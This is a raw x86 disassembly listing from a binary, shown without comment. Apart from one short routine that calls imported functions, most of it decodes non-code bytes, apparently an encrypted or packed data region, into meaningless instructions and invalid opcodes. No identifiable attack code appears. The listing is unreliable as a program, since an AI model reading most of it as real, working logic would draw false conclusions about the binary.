  422da5:	inc    esi
  422da6:	jmp    0xbb55:0x7d9aa917
  422dad:	sbb    ebx,ecx
  422daf:	hlt    
  422db0:	cld    
  422db1:	mov    ah,0xb4
  422db3:	xor    al,0xa4
  422db5:	retf   
  422db6:	adc    eax,0x33e39352
  422dbb:	cli    
  422dbc:	push   es
  422dbd:	les    ebp,FWORD PTR [edx-0x21]
  422dc0:	fcomp  QWORD PTR [ecx]
  422dc2:	int    0x57
  422dc4:	inc    ebx
  422dc5:	mul    BYTE PTR [esi-0x4fd655e8]
  422dcb:	ficom  WORD PTR [esi-0x20e391d2]
  422dd1:	inc    eax
  422dd2:	fisttp WORD PTR [edx]
  422dd4:	add    dh,BYTE PTR [eax+0x5671376b]
  422dda:	int3   
  422ddb:	sti    
  422ddc:	jns    0x422e34
  422dde:	mov    ecx,0xb0707adc
  422de3:	cmp    eax,0x896e01c7
  422de8:	mov    bh,0x3a
  422dea:	cmp    ah,ch
  422dec:	mov    WORD PTR [esi+0x37],ds
  422def:	and    esi,DWORD PTR [edx]
  422df1:	sahf   
  422df2:	fcmovnbe st,st(4)
  422df4:	jb     0x422d88
  422df6:	adc    BYTE PTR [ecx+0x7fa20e43],0xa
  422dfd:	cs push ds
  422dff:	mov    ebp,0x32988296
  422e04:	loope  0x422dce
  422e06:	fs mov edx,0xe9169bb7
  422e0c:	dec    eax
  422e0d:	push   ecx
  422e0e:	jmp    0xba0d:0x63c9fb04
  422e15:	test   eax,0x6b4a4b8f
  422e1a:	test   eax,0x7d064b9c
  422e1f:	imul   edi,DWORD PTR [ecx-0x26],0x1216c6b4
  422e26:	push   edi
  422e27:	test   ebx,esi
  422e29:	into   
  422e2a:	int3   
  422e2b:	mov    dh,0x84
  422e2d:	pushf  
  422e2e:	or     ch,BYTE PTR [edx-0x24]
  422e31:	into   
  422e32:	sbb    BYTE PTR [esi-0x50252952],bl
  422e38:	adc    al,0xf1
  422e3a:	mov    ds:0x2d2e74d4,al
  422e3f:	jg     0x422e8e
  422e41:	sbb    esp,DWORD PTR [edi-0x47fd7f97]
  422e47:	out    0x7a,al
  422e49:	cwde   
  422e4a:	rcl    ebp,0x9b
  422e4d:	sub    ebx,DWORD PTR [edi+0x74]
  422e50:	retf   
  422e51:	push   ecx
  422e52:	mov    fs,eax
  422e54:	mov    edi,0xd87c50d8
  422e59:	add    edi,DWORD PTR [edx+0x40afa96c]
  422e5f:	sti    
  422e60:	adc    dh,BYTE PTR [ecx]
  422e62:	push   0x23d3e95e
  422e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e68:	add    eax,0xa50c6f6c
  422e6d:	push   edi
  422e6e:	add    DWORD PTR [ebx+edx*8],ebp
  422e71:	sub    al,0x73
  422e73:	push   es
  422e74:	fdivr  st(4),st
  422e76:	ficom  WORD PTR [eax-0x48]
  422e79:	popa   
  422e7a:	cmp    DWORD PTR [eax],0xcd9faa22
  422e80:	jno    0x422e50
  422e82:	fmul   st(1),st
  422e84:	push   ecx
  422e85:	sub    BYTE PTR [edx-0x473464f2],0x70
  422e8c:	loopne 0x422e7c
  422e8e:	sbb    edx,esp
  422e90:	push   0x37
  422e92:	arpl   WORD PTR [edx-0x77],di
  422e95:	or     BYTE PTR [ebp-0x12],cl
  422e98:	lock in al,dx
  422e9a:	pop    edi
  422e9b:	mov    edi,0x538afdc2
  422ea0:	scas   eax,DWORD PTR es:[edi]
  422ea1:	and    esi,ebp
  422ea3:	das    
  422ea4:	sub    al,0x45
  422ea6:	stos   DWORD PTR es:[di],eax
  422ea8:	mov    ecx,0xa7f2fe3e
  422ead:	(bad)  
  422eae:	fidiv  DWORD PTR ds:0x5db94c63
  422eb4:	mov    edx,0x37e97fb6
  422eb9:	jb     0x422e3c
  422ebb:	lock sbb DWORD PTR [esi-0x77ef14a9],esp
  422ec2:	xchg   esi,eax
  422ec3:	pusha  
  422ec4:	in     eax,0x4d
  422ec6:	adc    eax,DWORD PTR [ecx-0x7a]
  422ec9:	stc    
  422eca:	retf   0xd049
  422ecd:	mov    cl,0x67
  422ecf:	mov    ds:0xd0c268c2,eax
  422ed4:	cli    
  422ed5:	std    
  422ed6:	mov    eax,ebp
  422ed8:	fisub  DWORD PTR [edx]
  422eda:	psrlw  mm3,QWORD PTR [esp+ebp*2+0x7]
  422edf:	add    esp,DWORD PTR [ebx-0x623cf651]
  422ee5:	popa   
  422ee6:	xchg   ecx,eax
  422ee7:	sbb    BYTE PTR [eax],bl
  422ee9:	fbld   TBYTE PTR [eax]
  422eeb:	sar    BYTE PTR [ecx+0x3565ffc4],0x33
  422ef2:	daa    
  422ef3:	xchg   ecx,eax
  422ef4:	lods   al,BYTE PTR ds:[esi]
  422ef5:	sbb    DWORD PTR [edx],edx
  422ef7:	shr    BYTE PTR [eax-0x1f08e3b3],cl
  422efd:	enter  0x93e4,0x18
  422f01:	rcl    DWORD PTR [ebx],cl
  422f03:	push   edx
  422f04:	adc    BYTE PTR [edi+ecx*2],ch
  422f07:	imul   esi,DWORD PTR [esi],0xca64eaf4
  422f0d:	or     al,0xdd
  422f0f:	mov    edx,0xfdf4036a
  422f14:	push   ebp
  422f15:	push   edx
  422f16:	and    DWORD PTR [ecx+eiz*8],edi
  422f19:	inc    eax
  422f1a:	pop    ss
  422f1b:	lahf   
  422f1c:	mov    ebp,0x1b8
  422f21:	add    BYTE PTR [ebx-0x333ca21b],cl
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0xc05dc643
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	dec    ebx
  422fc4:	sub    bh,BYTE PTR [ecx]
  422fc6:	cld    
  422fc7:	mov    ecx,0x99f5ea44
  422fcc:	fsubr  QWORD PTR [ebx+ebx*2-0x568f86e6]
  422fd3:	inc    esp
  422fd4:	mov    edx,0x9df5ea44
  422fd9:	fsubr  QWORD PTR [ebx+ebx*1-0x568f791b]
  422fe0:	cld    
  422fe1:	mov    edx,0x9df5ea44
  422fe6:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  422fed:	cld    
  422fee:	mov    edx,0x9df5ea44
  422ff3:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  422ffa:	cld    
  422ffb:	mov    edx,0x65f5ea44
  423000:	fsubr  QWORD PTR [ebx+ebx*2-0x58356615]
  423007:	cld    
  423008:	push   cs
  423009:	dec    ebp
  42300a:	daa    
  42300b:	aam    0x25
  42300d:	fucom  st(0)
  42300f:	xchg   esi,eax
  423010:	(bad)  
  423011:	rcr    BYTE PTR [eax],cl
  423013:	ror    BYTE PTR [edi-0x6567cb66],0xfa
  42301a:	scas   al,BYTE PTR es:[edi]
  42301b:	int    0x36
  42301d:	(bad)
  423020:	(bad)  
  423021:	xchg   edx,eax
  423022:	aad    0x30
  423024:	retf   0xf897
  423027:	cld    
  423028:	fisubr WORD PTR [esi]
  42302a:	mov    esp,DWORD PTR [esi-0x12338e7]
  423030:	or     edi,DWORD PTR [ecx-0x374c0f2b]
  423036:	ds retf 
  423038:	mov    edi,DWORD PTR [ebp-0x5d]
  42303b:	fdivr  DWORD PTR [edx-0x620a15bc]
  423041:	fsubr  QWORD PTR [esp+ebx*2-0x15d68584]
  423048:	add    al,0x28
  42304a:	dec    esi
  42304b:	test   eax,0xefd60f0d
  423050:	mov    ds:0xcc288c77,eax
  423055:	lock mov al,0x1b
  423058:	adc    ah,BYTE PTR [edi-0x69]
  42305b:	test   cl,cl
  42305d:	arpl   di,bp
  42305f:	inc    esp
  423060:	mov    BYTE PTR [ebx],bh
  423062:	mul    dl
  423064:	and    ebx,edx
  423066:	push   ebp
  423068:	and    al,0x3e
  42306a:	push   ecx
  42306b:	leave  
  42306c:	or     BYTE PTR [ecx-0x5d],cl
  42306f:	mov    edx,0xbfe0d642
  423074:	sbb    eax,0x1d11a6cd
  423079:	adc    al,0x7a
  42307b:	jecxz  0x4230f9
  42307d:	mov    ebx,0xf0db24e
  423082:	(bad)  
  423083:	out    dx,eax
  423084:	mov    ds:0x50588c76,eax
  423089:	outs   dx,BYTE PTR ds:[esi]
  42308a:	mov    al,0xfb
  42308c:	xor    dh,BYTE PTR [ebp-0x69]
  42308f:	xchg   ecx,eax
  423090:	push   esp
  423091:	leave  
  423092:	out    dx,eax
  423093:	ficom  WORD PTR ds:0xbcb2f694
  423099:	js     0x42309a
  42309b:	lds    edi,FWORD PTR [ecx+0x7ea751a4]
  4230a1:	loop   0x423046
  4230a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a4:	fisttp WORD PTR [ebx-0x20]
  4230a7:	mov    bh,0x65
  4230a9:	dec    esi
  4230aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230ab:	or     DWORD PTR [ebp+eiz*8+0x2804ea18],ecx
  4230b2:	dec    esi
  4230b3:	jmp    0xe55b:0xacdc9df5
  4230ba:	xchg   BYTE PTR [eax],ah
  4230bc:	in     al,dx
  4230bd:	cld    
  4230be:	mov    edx,0x9df7eb08
  4230c3:	xor    BYTE PTR [edi+0x4],cl
  4230c6:	stos   BYTE PTR es:[edi],al
  4230c7:	xchg   BYTE PTR [eax-0x57],dh
  4230ca:	cld    
  4230cb:	mov    edx,0x7df5ea44
  4230d0:	fsubr  QWORD PTR [edi+0x7a87ee5a]
  4230d6:	test   eax,0xea4056fc
  4230db:	cmc    
  4230dc:	cdq    
  4230dd:	fisubr DWORD PTR [ebx+ebx*2-0x578f791b]
  4230e4:	inc    ecx
  4230e5:	mov    edx,0x9de5ea44
  4230ea:	fsubr  QWORD PTR [ebx+ebx*2-0x568f7920]
  4230f1:	mov    ebp,0xf5fa44ba
  4230f6:	popf   
  4230f7:	fsubr  QWORD PTR [esi+0x7083e55b]
  4230fd:	test   al,0xfc
  4230ff:	mov    edx,0x98f5ea44
  423104:	fsubr  QWORD PTR [ebp+0x7086e55b]
  42310a:	test   eax,0xea4f3afc
  42310f:	cmc    
  423110:	cdq    
  423111:	fsubr  QWORD PTR [esi+eiz*8-0x548f7c2c]
  423118:	cld    
  423119:	mov    edx,0x8df5eac4
  42311e:	fsubr  QWORD PTR [ebx+ecx*2-0x568f791b]
  423125:	in     al,dx
  423126:	mov    edx,0x9df5fa44
  42312b:	fsubr  QWORD PTR [ebx+ebx*2-0x568f691b]
  423132:	cld    
  423133:	mov    edx,0x9df5ea44
  423138:	fsubr  QWORD PTR [ebx+ebx*2-0x5684179f]
  42313f:	xchg   ebp,eax
  423140:	mov    ecx,0xadf5ea44
  423145:	xlat   BYTE PTR ds:[ebx]
  423146:	lods   al,BYTE PTR ds:[esi]
  423147:	xchg   esp,eax
  423148:	fadd   DWORD PTR [esi-0x45035690]
  42314e:	inc    esp
  42314f:	jmp    0xe55b:0xacdc9df5
  423156:	xchg   BYTE PTR [eax-0x57],dh
  423159:	cld    
  42315a:	mov    edx,0x9df5ea44
  42315f:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423166:	cld    
  423167:	mov    edx,0x9df5ea44
  42316c:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423173:	cld    
  423174:	mov    edx,0x9df5ea44
  423179:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423180:	cld    
  423181:	mov    edx,0x9df5ea44
  423186:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42318d:	cld    
  42318e:	mov    edx,0x9df5ea44
  423193:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42319a:	cld    
  42319b:	mov    edx,0x9df5ea44
  4231a0:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4231a7:	cld    
  4231a8:	mov    edx,0x9df5ea44
  4231ad:	fsubr  QWORD PTR [ebx+ebx*2-0x788f791b]
  4231b4:	mov    bh,bl
  4231b6:	cmp    al,0x9e
  4231b8:	cmc    
  4231b9:	popf   
  4231ba:	fsubr  QWORD PTR [ebx+edi*2-0x468f7912]
  4231c1:	cld    
  4231c2:	mov    edx,0x9df1d044
  4231c7:	fsubr  QWORD PTR [eax+0x35d6e55b]
  4231cd:	jmp    0x9df5:0xea0beece
  4231d4:	fsubr  QWORD PTR [ebx+ebx*2+0x497086c5]
  4231db:	ror    al,cl
  4231dd:	aaa    
  4231de:	cwde   
  4231df:	xchg   esi,eax
  4231e0:	popf   
  4231e1:	fsubr  QWORD PTR [ebx+ebx*2-0x568f794b]
  4231e8:	int3   
  4231e9:	mov    cl,0x44
  4231eb:	jmp    0xe165:0xacdc9da5
  4231f2:	xchg   BYTE PTR [eax-0x57],dh
  4231f5:	cld    
  4231f6:	mov    edx,0x9df5ea44
  4231fb:	fsubr  QWORD PTR [ebx+ebx*2-0x568f591b]
  423202:	sbb    al,0xba
  423204:	inc    esp
  423205:	jmp    0xe55b:0xacdc9df5
  42320c:	xchg   BYTE PTR [eax-0x57],dh
  42320f:	cld    
  423210:	mov    edx,0x9df5ea44
  423215:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42321c:	cld    
  42321d:	mov    edx,0x9df5ea44
  423222:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423229:	cld    
  42322a:	mov    edx,0x9df5ea44
  42322f:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423236:	cld    
  423237:	mov    edx,0x9df5ea44
  42323c:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423243:	cld    
  423244:	mov    edx,0x9df5ea44
  423249:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423250:	cld    
  423251:	mov    edx,0x9df5ea44
  423256:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42325d:	cld    
  42325e:	mov    edx,0x9df5ea44
  423263:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42326a:	cld    
  42326b:	mov    edx,0x9df5ea44
  423270:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423277:	cld    
  423278:	mov    edx,0x9df5ea44
  42327d:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423284:	cld    
  423285:	mov    edx,0x9df5ea44
  42328a:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423291:	cld    
  423292:	mov    edx,0x9df5ea44
  423297:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42329e:	cld    
  42329f:	mov    edx,0x9df5ea44
  4232a4:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232ab:	cld    
  4232ac:	mov    edx,0x9df5ea44
  4232b1:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232b8:	cld    
  4232b9:	mov    edx,0x9df5ea44
  4232be:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232c5:	cld    
  4232c6:	mov    edx,0x9df5ea44
  4232cb:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232d2:	cld    
  4232d3:	mov    edx,0x9df5ea44
  4232d8:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232df:	cld    
  4232e0:	mov    edx,0x9df5ea44
  4232e5:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232ec:	cld    
  4232ed:	mov    edx,0x9df5ea44
  4232f2:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4232f9:	cld    
  4232fa:	mov    edx,0x9df5ea44
  4232ff:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423306:	cld    
  423307:	mov    edx,0x9df5ea44
  42330c:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423313:	cld    
  423314:	mov    edx,0x9df5ea44
  423319:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423320:	cld    
  423321:	mov    edx,0x9df5ea44
  423326:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42332d:	cld    
  42332e:	mov    edx,0x9df5ea44
  423333:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42333a:	cld    
  42333b:	mov    edx,0x9df5ea44
  423340:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423347:	cld    
  423348:	mov    edx,0x9df5ea44
  42334d:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423354:	cld    
  423355:	mov    edx,0x9df5ea44
  42335a:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423361:	cld    
  423362:	mov    edx,0x9df5ea44
  423367:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42336e:	cld    
  42336f:	mov    edx,0x9df5ea44
  423374:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  42337b:	cld    
  42337c:	mov    edx,0x9df5ea44
  423381:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423388:	cld    
  423389:	mov    edx,0x9df5ea44
  42338e:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  423395:	cld    
  423396:	mov    edx,0x9df5ea44
  42339b:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4233a2:	cld    
  4233a3:	mov    edx,0x9df5ea44
  4233a8:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4233af:	cld    
  4233b0:	mov    edx,0x9df5ea44
  4233b5:	fsubr  QWORD PTR [ebx+ebx*2-0x568f791b]
  4233bc:	cld    
  4233bd:	mov    edx,0x9df5ea44
  4233c2:	fsub   st(3),st
  4233c4:	mov    ch,0xef
  4233c6:	xchg   BYTE PTR [edi-0x57],bl
  4233c9:	cld    
  4233ca:	stos   BYTE PTR es:[edi],al
  4233cb:	inc    esp
  4233cc:	jmp    0x1a3d:0xdd063fdf
  4233d3:	stos   DWORD PTR es:[edi],eax
  4233d4:	out    dx,al
  4233d5:	lods   al,BYTE PTR cs:[esi]
  4233d7:	push   edi
  4233d8:	jb     0x4233dc
  4233da:	out    0x29,al
  4233dc:	dec    ecx
  4233dd:	retf   0x612a
  4233e0:	fsub   QWORD PTR [ebx+0x18]
  4233e3:	dec    ebx
  4233e4:	lods   al,BYTE PTR ds:[esi]
  4233e5:	sub    DWORD PTR [esi],ecx
  4233e7:	jg     0x423405
  4233e9:	sbb    al,BYTE PTR [edx+0x49b97539]
  4233ef:	call   0xbaf5:0xc8530bb3
  4233f6:	jnp    0x42341c
  4233f8:	push   cs
  4233f9:	mov    ah,0xeb
  4233fb:	fstp   DWORD PTR [ebx+0x5b5067c1]
  423401:	xchg   ebp,eax
  423402:	lea    eax,[edi-0x10f5b576]
  423408:	rol    ebp,1
  42340a:	sbb    eax,DWORD PTR [eax]
  42340c:	push   0x22c9782d
  423411:	call   0x3509:0x721f282b
  423418:	mov    esi,0x81ca93d3
  42341d:	test   eax,0x514beab1
  423422:	jmp    0x423495
  423424:	mov    ebx,0xf8a348f0
  423429:	icebp  
  42342a:	es push si
  42342d:	lods   eax,DWORD PTR ds:[esi]
  42342e:	js     0x4233c6
  423430:	pop    esi
  423431:	shl    DWORD PTR [eax+0x5e43bc21],0x42
  423438:	ins    BYTE PTR es:[edi],dx
  423439:	cmp    esi,DWORD PTR [ebx]
  42343b:	int    0x33
  42343d:	dec    ebp
  42343e:	push   ds
  42343f:	push   ebx
  423440:	xchg   esp,eax
  423441:	mov    eax,ds:0xcf74576
  423446:	pop    edi
  423447:	push   cs
  423448:	or     eax,0x6d1eedee
  42344d:	ss leave 
  42344f:	repnz mov al,0xf
  423452:	jl     0x4234ce
  423454:	sbb    ah,0x38
  423457:	xchg   edi,eax
  423458:	lods   eax,DWORD PTR ds:[esi]
  423459:	cmp    DWORD PTR [eax-0x2189de57],ecx
  42345f:	inc    esp
  423460:	sub    DWORD PTR [edi],0xda842044
  423466:	hlt    
  423467:	repnz ror DWORD PTR [eax-0x21ece087],1
  42346e:	mov    ch,0x18
  423470:	adc    ebx,DWORD PTR [ebx+0x5b30bd7]
  423476:	or     BYTE PTR [ebx+edi*1+0x5f],ah
  42347a:	aad    0x2e
  42347c:	fcomp  QWORD PTR [eax]
  42347e:	test   BYTE PTR [esi-0x4d9b4142],dl
  423484:	sbb    eax,DWORD PTR [esi+edx*4-0x3b]
  423488:	adc    ecx,DWORD PTR [edi+0x6ff500f6]
  42348e:	mov    cl,BYTE PTR [ecx+0x52]
  423491:	dec    ebp
  423492:	or     BYTE PTR [edx-0x57a33802],dh
  423498:	jb     0x42345a
  42349a:	mov    ?,WORD PTR [esi+0x6]
  42349d:	xchg   esi,eax
  42349e:	sub    eax,0xf8b9bdb3
  4234a3:	std    
  4234a4:	and    al,0x7d
  4234a6:	scas   al,BYTE PTR es:[edi]
  4234a7:	sub    ebp,DWORD PTR [ecx+0x7a]
  4234aa:	int3   
  4234ab:	iret   
  4234ac:	dec    ebx
  4234ad:	sub    BYTE PTR [eax-0x1154dfca],dl
  4234b3:	xlat   BYTE PTR ds:[ebx]
  4234b4:	loope  0x42348d
  4234b6:	cs inc edi
  4234b8:	outs   dx,DWORD PTR ds:[esi]
  4234b9:	je     0x4234d9
  4234bb:	sbb    BYTE PTR [ecx-0x7b],0x2b
  4234bf:	retf   0x1af
  4234c2:	inc    edx
  4234c3:	imul   edi,DWORD PTR [ebx+0x45cf4502],0xffffff98
  4234ca:	test   edi,edi
  4234cc:	adc    BYTE PTR [edi+0x75],0x1
  4234d0:	xor    bh,al
  4234d2:	sti    
  4234d3:	call   0x5f76:0x11cefce3
  4234da:	jge    0x423549
  4234dc:	fcmovb st,st(0)
  4234de:	fs or  al,0xf0
  4234e1:	xchg   BYTE PTR [ebx],cl
  4234e3:	mov    al,ds:0xeb46eebd
  4234e8:	sub    DWORD PTR [edx-0x21a2b707],ebp
  4234ee:	push   eax
  4234ef:	lods   eax,DWORD PTR ds:[esi]
  4234f0:	js     0x4234d4
  4234f2:	mov    ds:0x5dde0d4b,eax
  4234f7:	push   ebx
  4234f8:	sbb    BYTE PTR [ecx+ebx*4-0x2],ah
  4234fc:	mov    ds:0x567a63dc,eax
  423501:	ror    ah,1
  423503:	je     0x4234a4
  423505:	pop    ds
  423506:	jl     0x42348d
  423508:	pop    ecx
  423509:	lods   eax,DWORD PTR ds:[esi]
  42350a:	es push eax
  42350c:	ja     0x4234f7
  42350e:	scas   al,BYTE PTR es:[edi]
  42350f:	adc    ebp,DWORD PTR [edx+ebx*1]
  423512:	sti    
  423513:	xchg   ecx,eax
  423514:	loopne 0x4234cf
  423516:	push   ds
  423517:	dec    eax
  423518:	imul   esi,DWORD PTR [esp+edi*1+0x17b7f12a],0x122d3b8b
  423523:	lods   al,BYTE PTR ds:[esi]
  423524:	int3   
  423525:	xor    al,0xb1
  423527:	int    0x6a
  423529:	push   edi
  42352a:	out    0x1b,eax
  42352c:	ret    
  42352d:	js     0x42356b
  42352f:	adc    al,0x9
  423531:	ins    DWORD PTR es:[edi],dx
  423532:	jmp    0xb15267fa
  423537:	div    BYTE PTR [ebp+0x5dcf01f8]
  42353d:	into   
  42353e:	jp     0x42357d
  423540:	xchg   esi,eax
  423541:	pop    eax
  423542:	cmp    eax,0xeade3a9a
  423547:	ret    
  423548:	inc    esi
  423549:	nop
  42354a:	push   ecx
  42354b:	xchg   BYTE PTR [edx-0x2149fc6f],ch
  423551:	jns    0x4234ec
  423553:	jmp    0xf83f:0x16764e60
  42355a:	pop    ecx
  42355b:	ins    DWORD PTR es:[edi],dx
  42355c:	scas   al,BYTE PTR es:[edi]
  42355d:	cs sti 
  42355f:	xor    edx,DWORD PTR [edx+0x3d5c151a]
  423565:	push   edx
  423566:	jg     0x4235d5
  423568:	dec    edx
  423569:	cmp    eax,0x89a2d307
  42356e:	xor    eax,0x5fbc29ea
  423573:	xchg   ebx,eax
  423574:	(bad)  
  423575:	mov    edx,0x6f136392
  42357a:	pop    ebp
  42357b:	push   edx
  42357c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42357d:	retf   
  42357e:	ja     0x423565
  423580:	jae    0x423531
  423582:	pop    es
  423583:	xchg   esi,eax
  423584:	nop
  423585:	neg    BYTE PTR [edx+ebx*1]
  423588:	ins    BYTE PTR es:[edi],dx
  423589:	add    eax,0x2095e58e
  42358e:	test   BYTE PTR [edx],bl
  423590:	pop    ebx
  423591:	je     0x42357d
  423593:	into   
  423594:	cmp    DWORD PTR [esi-0x404fa9],esi
  42359a:	push   cs
  42359b:	lods   eax,DWORD PTR ds:[esi]
  42359c:	sub    eax,ecx
  42359e:	mov    BYTE PTR [ebx-0x3c6baf5d],dh
  4235a4:	adc    al,0xba
  4235a6:	sti    
  4235a7:	clc    
  4235a8:	test   ebp,esi
  4235aa:	dec    esi
  4235ab:	dec    esi
  4235ac:	int3   
  4235ad:	inc    ebx
  4235ae:	sti    
  4235af:	mov    DWORD PTR [ebx],ebx
  4235b1:	dec    esp
  4235b2:	nop    DWORD PTR [ebp-0x3d084bb6]
  4235b9:	rol    DWORD PTR [ebp-0x356d2606],cl
  4235bf:	dec    esi
  4235c0:	mov    DWORD PTR [esi],ecx
  4235c2:	xchg   DWORD PTR [ebx-0x26e6990c],ecx
  4235c8:	or     al,0xb
  4235ca:	mov    al,0x10
  4235cc:	inc    edi
  4235cd:	and    eax,0x28b24b91
  4235d2:	adc    ch,BYTE PTR [edi-0x56249f93]
  4235d8:	(bad)  
  4235db:	sbb    ch,BYTE PTR [esi-0x7c]
  4235de:	add    esi,DWORD PTR [ebp-0x59]
  4235e1:	ret    
  4235e2:	sub    bh,BYTE PTR [ebx+esi*1]
  4235e5:	(bad)  
  4235e6:	loopne 0x42361c
  4235e8:	jle    0x42358b
  4235ea:	mov    edi,0x1b8f5e7f
  4235ef:	push   ebp
  4235f0:	xchg   al,cl
  4235f2:	shl    BYTE PTR [esi],0xac
  4235f5:	sar    BYTE PTR [edx],1
  4235f7:	lods   al,BYTE PTR ds:[esi]
  4235f8:	dec    ebx
  4235f9:	add    BYTE PTR [ecx],ch
  4235fb:	lods   eax,DWORD PTR ds:[esi]
  4235fc:	or     al,0xdb
  4235fe:	and    DWORD PTR [ebx+0x61807f92],0xffffffd6
  423605:	nop
  423606:	push   ds
  423607:	sub    BYTE PTR [edx],ah
  423609:	ja     0x4235cc
  42360b:	jbe    0x423672
  42360d:	inc    eax
  42360e:	push   ecx
  42360f:	ret    0x1823
  423612:	mov    dl,0x51
  423614:	sahf   
  423615:	lea    edi,[eax]
  423617:	mov    edx,ecx
  423619:	jno    0x4235f8
  42361b:	out    0xa,al
  42361d:	(bad)  
  42361e:	(bad)  
  42361f:	scas   al,BYTE PTR es:[edi]
  423620:	jae    0x42368d
  423622:	retf   
  423623:	mov    BYTE PTR [eax-0x6f47e247],ah
  423629:	jnp    0x4235d9
  42362b:	adc    DWORD PTR [esi+eiz*1-0x2a],ebp
  42362f:	aaa    
  423630:	dec    eax
  423631:	xchg   esp,eax
  423632:	loopne 0x4235c5
  423634:	cdq    
  423635:	dec    esp
  423636:	lods   eax,DWORD PTR ds:[si]
  423638:	push   edi
  423639:	xchg   edi,eax
  42363a:	jns    0x42364d
  42363c:	pop    ds
  42363d:	hlt    
  42363e:	mov    eax,ds:0x8b638645
  423643:	popa   
  423644:	add    BYTE PTR [edx],bh
  423646:	pop    ss
  423647:	pop    ecx
  423648:	push   esp
  423649:	(bad)  
  42364a:	xor    BYTE PTR [eax-0x174c28ca],dh
  423650:	push   ds
  423651:	pop    es
  423652:	shl    DWORD PTR [ebp-0x12],0x48
  423656:	shl    DWORD PTR [edi-0x5e7a1ef5],0x1e
  42365d:	adc    eax,DWORD PTR [ecx-0x3]
  423660:	and    DWORD PTR [edi+0x38e47f35],ebx
  423666:	in     eax,0x6a
  423668:	mov    ch,0xfd
  42366a:	sub    DWORD PTR [esi-0x5fcb9a8b],esi
  423670:	adc    BYTE PTR [ecx+0x4a],dh
  423673:	(bad)  
  423674:	cwde   
  423675:	dec    edi
  423676:	xchg   BYTE PTR [edx],ah
  423678:	mov    edx,DWORD PTR [edi]
  42367a:	push   eax
  42367b:	stos   BYTE PTR es:[edi],al
  42367c:	aad    0x51
  42367e:	es js  0x42362b
  423681:	mov    ch,0xb8
